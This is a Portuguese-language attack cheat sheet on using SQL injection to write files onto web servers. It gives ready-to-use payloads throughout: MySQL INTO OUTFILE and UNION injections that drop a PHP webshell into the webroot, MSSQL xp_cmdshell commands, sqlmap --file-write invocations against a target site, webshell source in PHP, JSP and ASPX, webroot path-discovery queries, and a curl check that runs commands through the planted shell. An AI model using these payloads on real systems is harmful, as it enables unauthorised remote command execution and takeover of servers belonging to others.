# Escrita de Arquivos via SQL Injection

## MySQL — INTO OUTFILE / DUMPFILE

### Pré-requisitos
- Privilégio `FILE`
- `secure_file_priv` = "" (sem restrição)
- Permissão de escrita no diretório destino
- Arquivo não pode existir previamente

```sql
-- Verificar permissões
SELECT @@secure_file_priv;
SELECT file_priv FROM mysql.user WHERE user = CURRENT_USER();

-- Escrever arquivo simples
SELECT 'conteudo' INTO OUTFILE '/tmp/teste.txt';

-- Escrever webshell PHP
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';

-- DUMPFILE (sem newline extra, para binários)
SELECT 0x3c3f706870... INTO DUMPFILE '/var/www/html/shell.php';
```

### Via UNION Injection
```sql
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL
  INTO OUTFILE '/var/www/html/vlad.php'--
```

## MSSQL — sp_makewebtask / xp_cmdshell

```sql
-- Via xp_cmdshell
EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php';

-- Via echo com redirecionamento
EXEC xp_cmdshell 'echo test > C:\windows\temp\test.txt';
```

## Com SQLMap

```bash
# Escrever arquivo no servidor
sqlmap -u "http://alvo.com/?id=1" \
  --file-write=shell.php \
  --file-dest=/var/www/html/shell.php \
  --batch

# Windows
sqlmap -u "http://alvo.com/?id=1" \
  --file-write=shell.php \
  --file-dest="C:\\inetpub\\wwwroot\\shell.php" \
  --batch
```

## Webshells Comuns

### PHP Simples
```php
<?php system($_GET['cmd']); ?>
```

### PHP com Autenticação
```php
<?php if(md5($_GET['pass'])=='5f4dcc3b5aa765d61d8327deb882cf99'){system($_GET['cmd']);} ?>
```

### JSP (Java)
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### ASPX
```aspx
<%@ Page Language="C#"%>
<% System.Diagnostics.Process.Start(Request["cmd"]); %>
```

## Descobrir Path do Webroot

```sql
-- MySQL: variáveis de configuração
SELECT @@datadir;
SELECT @@basedir;

-- Via erro (path disclosure)
' AND 1=LOAD_FILE('/nao_existe')--

-- Via PHP info (se disponível)
-- Navegar para: http://alvo.com/phpinfo.php
```

## Verificação de Sucesso

```bash
# Verificar se webshell foi criada
curl "http://alvo.com/shell.php?cmd=id"
# Resposta esperada: uid=33(www-data) gid=33(www-data)
```
